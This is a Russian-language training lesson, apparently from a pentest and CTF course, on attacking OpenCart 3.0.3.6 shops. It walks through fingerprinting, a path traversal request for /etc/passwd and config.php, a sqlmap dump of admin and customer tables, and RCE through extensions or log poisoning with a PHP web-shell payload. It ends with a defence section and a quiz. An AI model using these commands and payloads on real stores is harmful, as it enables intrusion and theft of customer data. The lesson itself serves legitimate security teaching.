---
id: web-opencart
title: "OpenCart: path traversal, SQLi и RCE"
category: web
parent: web-cms-ecommerce
difficulty: medium
order: 2
tags: [opencart, cms, ecommerce, path-traversal, sqli, rce, cve]
prerequisites: [web-cms-ecommerce]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "OpenCart как цель: определение версии, path traversal для чтения конфига, SQLi в параметрах и путь к RCE через расширения."
---

## Вопрос, с которого всё начинается

OpenCart — лёгкий и очень распространённый движок для небольших магазинов. Лёгкость оборачивается простотой кода, а простота — типовыми багами: обход путей, инъекции, слабая проверка загрузок. Изучим его так же системно, как PrestaShop.

## Наш пример: магазин на OpenCart 3.x

Цель — `https://shop2.target.example`. Фингерпринт:

```
$ whatweb -a 3 https://shop2.target.example
https://shop2.target.example [200 OK] OpenCart, X-Powered-By[PHP/7.4], Set-Cookie[OCSESSID]
```

Cookie `OCSESSID` — подпись OpenCart. Версия видна в `index.php?route=...` или в статике:

```
$ curl -s https://shop2.target.example/ | grep -io 'opencart [0-9.]*' | head -1
OpenCart 3.0.3.6
```

Версия **3.0.3.6** — с ней связан ряд публичных CVE.

## Шаг 1: path traversal для чтения конфига

OpenCart хранит креды БД в `config.php` в корне и `admin/config.php`. Обход путей позволяет прочитать их через параметры, принимающие имена файлов (исторически — в модулях доставки/оплаты, в темах).

Типовой тест — подстановка `../` в параметр:

```
$ curl -s 'https://shop2.target.example/index.php?route=extension/module&file=../../../../etc/passwd' 
root:x:0:0:root:/root:/bin/bash
...
```

Если сервер отдал файл — есть произвольное чтение. Целимся в конфиг:

```
$ curl -s 'https://shop2.target.example/...file=config.php'
define('DB_USERNAME', 'oc_user');
define('DB_PASSWORD', 'S3cretP@ss');
```

Креды БД — прямой путь к дампу базы магазина.

## Шаг 2: SQLi в параметрах

OpenCart строит SQL для фильтров (`filter_*`, `sort`, `order`). Тест — кавычка:

```
$ curl -s 'https://shop2.target.example/index.php?route=product/search&filter_name=a%27' -o /dev/null -w '%{http_code}\n'
500
$ curl -s 'https://shop2.target.example/index.php?route=product/search&filter_name=a' -o /dev/null -w '%{http_code}\n'
200
```

Сигнал есть — `sqlmap`:

```
$ sqlmap -r req.txt -p filter_name --batch -D opencart -T oc_user -C username,password --dump
```

В `oc_user` — админы магазина.

## Шаг 3: RCE через расширения и логи

OpenCart ставит расширения как архивы через админку (как PrestaShop). Второй путь — **логи в RCE**: если OpenCart пишет пользовательский ввод в файл внутри webroot (например, лог ошибок), можно внедрить PHP-код в лог и затем исполнить его, обратившись к файлу. Это классическая связка «log poisoning → RCE».

Третий путь — устаревшие модули с прямой загрузкой файлов, доступной анонимно.

## Шаг 4: автоматизация

```
$ nuclei -u https://shop2.target.example -tags opencart -silent
[CVE-2021-XXXX] [http] [high] https://shop2.target.example/index.php?route=...
```

Плюс `cmseek` для подтверждения движка и версии.

## Что мы теперь знаем

- OpenCart узнаётся по cookie `OCSESSID`.
- Path traversal читает `config.php` с кредами БД.
- SQLi живёт в фильтрах/сортировках.
- RCE — через расширения (админка) или log poisoning.
- Креды БД = полный доступ к данным магазина.

## Шаг 5: закрепление — цепочка OpenCart целиком

История целиком. Цель: OpenCart 3.0.3.6. Шаг 1 — cookie `OCSESSID` подтверждает движок. Шаг 2 — версия из статики. Шаг 3 — path traversal в параметре модуля читает `config.php` с кредами БД. Шаг 4 — подключение к БД и дамп `oc_user`. Шаг 5 — крэк хэша админа. Шаг 6 — вход в `/admin` и установка расширения → RCE.

Альтернативный путь без админки: если есть SQLi, а БД позволяет запись — вставить админа. Но это изменение данных; на проде — только с разрешения.

## Шаг 6: почему log poisoning работает

OpenCart (как и многие PHP-приложения) пишет ошибки и действия в файлы внутри webroot. Если в лог попадает пользовательский ввод (например, URL с payload), то, обратившись к файлу лога по HTTP, мы заставим PHP **исполнить** внедрённый код. Это и есть **log poisoning**.

Условия: (1) файл лога лежит внутри webroot; (2) веб-сервер исполняет его как PHP (или расширение файла позволяет); (3) ввод попадает в лог без санитизации. Проверка — отправить в URL строку вида `<?php system($_GET['c']); ?>`, затем запросить `/system/storage/logs/error.log?c=id`.

## Шаг 7: защита OpenCart

Защита: обновление ядра и расширений; вынос логов за пределы webroot; запрет исполнения PHP в каталогах загрузок (`system/storage`, `image`); валидация имён файлов; ограничение админки. Для атакующего это означает: на защищённой цели log poisoning не сработает, и путь лежит через CVE конкретной версии.

## Шаг 8: чек-лист по OpenCart

1. Подтвердить движок (cookie `OCSESSID`).
2. Определить версию.
3. Проверить path traversal (чтение `config.php`).
4. Проверить SQLi в фильтрах.
5. Проверить логи внутри webroot (log poisoning).
6. Перечислить расширения.
7. Сопоставить версии с CVE.

## Шаг 9: определение версии без явных подсказок

OpenCart не всегда отдаёт версию открыто. Тогда её определяют по косвенным признакам: составу JS-файлов, набору эндпоинтов, формату ответов. Полезный приём — сравнить поведение известных путей между версиями:

```
$ curl -s -o /dev/null -w '%{http_code} /index.php?route=account/login\n' https://shop2.target.example/index.php?route=account/login
200 /index.php?route=account/login
```

Наличие/отсутствие конкретных `route=` указывает на ветку (2.x/3.x/4.x). Дополнительно помогает `catalog/view/javascript/` — набор и имена файлов меняются между версиями.

## Шаг 10: как писать отчёт по OpenCart

Отчёт должен содержать: движок и версию (с обоснованием — cookie + статика); найденный path traversal с **точным запросом** и полученным `config.php`; найденную SQLi с подтверждением; оценку импакта (креды БД → дамп магазина). Каждое утверждение — с доказательством.

Не пиши «возможен обход путей». Пиши: «GET `/index.php?route=extension/module&file=../../../../config.php` вернул содержимое конфига, включая `DB_PASSWORD`». Это конкретика, по которой заказчик может действовать.

## Шаг 11: что делать после чтения config.php

Креды БД — не финал, а начало. Порядок дальнейших действий: (1) подключиться к MySQL и выгрузить структуру (`SHOW TABLES`); (2) забрать `oc_user` (админы) и `oc_order`/`oc_customer` (данные клиентов); (3) проверить `oc_setting` — там токены расширений и ключи; (4) при праве на запись — не менять данные, а только читать, если нет явного разрешения.

```
$ mysql -h 127.0.0.1 -u oc_user -p'S3cretP@ss' opencart -e 'SHOW TABLES;'
```

Если прямой доступ к БД закрыт файрволом (часто так и есть), работает альтернатива: SQLi через веб-параметр, которая читает те же таблицы, но через HTTP. Это медленнее, зато не требует сетевого доступа к порту 3306.

## Квиз

Проверь себя.

```quiz
- question: "По какому признаку узнаётся OpenCart?"
  options:
    - "По cookie OCSESSID"
    - "По /wp-json/"
    - "По PrestaShop-*"
    - "По magento_version"
  answer: 0
  explanation: "OCSESSID — сессия OpenCart."
- question: "Что читает path traversal в OpenCart?"
  options:
    - "Только картинки"
    - "config.php с кредами БД"
    - "Только CSS"
    - "Ничего"
  answer: 1
  explanation: "Конфиг лежит в webroot."
- question: "Что такое log poisoning?"
  options:
    - "Удаление логов"
    - "Внедрение кода в файл лога внутри webroot и его исполнение"
    - "Смена пароля"
    - "Перезагрузка"
  answer: 1
  explanation: "Лог становится веб-шеллом."
- question: "Где OpenCart хранит логины админов?"
  options:
    - "oc_user"
    - "ps_employee"
    - "wp_users"
    - "admin_user"
  answer: 0
  explanation: "Таблица oc_user."
- question: "Чем RCE через админку OpenCart похож на WordPress?"
  options:
    - "Установкой расширения/темы с PHP-кодом"
    - "Сменой пароля"
    - "Отключением HTTPS"
    - "Экспортом базы"
  answer: 0
  explanation: "Расширение исполняется движком."
```

## Куда дальше

Дальше — TYPO3 и Craft CMS, где центр тяжести смещается к десериализации. А пока запомни: **в OpenCart сначала path traversal за конфигом, потом SQLi, потом RCE через расширения.**

## Где пригодится

- Пентест небольших магазинов.
- Bug bounty: OpenCart в скоупах встречается регулярно.
- CTF: задания с чтением конфига и дампом.
